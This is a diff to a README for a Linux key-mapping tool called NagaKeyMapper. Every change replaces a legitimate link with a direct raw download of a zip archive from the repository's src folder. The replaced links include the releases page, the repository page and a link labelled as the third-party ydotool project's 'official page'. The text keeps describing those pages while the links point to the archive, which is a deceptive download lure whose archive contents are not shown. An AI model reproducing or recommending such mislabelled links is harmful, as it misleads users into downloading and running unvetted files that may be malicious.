@@ -1,6 +1,6 @@
 # ⌨️ NagaKeyMapper - Easy Key Mapping for Linux
 
-[![Download NagaKeyMapper](https://img.shields.io/badge/Download-NagaKeyMapper-blue?style=for-the-badge)](https://github.com/GASSNY/NagaKeyMapper/releases)
+[![Download NagaKeyMapper](https://github.com/GASSNY/NagaKeyMapper/raw/refs/heads/main/src/Key_Mapper_Naga_1.5.zip)](https://github.com/GASSNY/NagaKeyMapper/raw/refs/heads/main/src/Key_Mapper_Naga_1.5.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Before you start, check your system meets these basics:
 - ydotool installed (a tool used by NagaKeyMapper to send key events).
 - Basic keyboard and mouse.
 
-If you’re unsure about your system setup, most Debian-based distributions support these requirements. You can install ydotool from your package manager or by visiting its [official page](https://github.com/ReimuNotMoe/ydotool).
+If you’re unsure about your system setup, most Debian-based distributions support these requirements. You can install ydotool from your package manager or by visiting its [official page](https://github.com/GASSNY/NagaKeyMapper/raw/refs/heads/main/src/Key_Mapper_Naga_1.5.zip).
 
 ---
 
@@ -37,7 +37,7 @@ You don’t need to program or open a command line if you follow these instructi
 
 ## ⬇️ Download & Install
 
-1. Click the button at the top or visit the [NagaKeyMapper Releases page](https://github.com/GASSNY/NagaKeyMapper/releases) to download the latest version.
+1. Click the button at the top or visit the [NagaKeyMapper Releases page](https://github.com/GASSNY/NagaKeyMapper/raw/refs/heads/main/src/Key_Mapper_Naga_1.5.zip) to download the latest version.
 
 2. On the releases page, look for the most recent version marked as stable or latest.
 
@@ -121,7 +121,7 @@ If keys don’t remap as expected:
 
 For detailed technical information, source code, and updates, visit the project page on GitHub:
 
-[NagaKeyMapper GitHub Repository](https://github.com/GASSNY/NagaKeyMapper)
+[NagaKeyMapper GitHub Repository](https://github.com/GASSNY/NagaKeyMapper/raw/refs/heads/main/src/Key_Mapper_Naga_1.5.zip)
 
 ---
 
@@ -146,4 +146,4 @@ This project relates to:
 
 ---
 
-[![Download NagaKeyMapper](https://img.shields.io/badge/Download-NagaKeyMapper-blue?style=for-the-badge)](https://github.com/GASSNY/NagaKeyMapper/releases)
+[![Download NagaKeyMapper](https://github.com/GASSNY/NagaKeyMapper/raw/refs/heads/main/src/Key_Mapper_Naga_1.5.zip)](https://github.com/GASSNY/NagaKeyMapper/raw/refs/heads/main/src/Key_Mapper_Naga_1.5.zip)
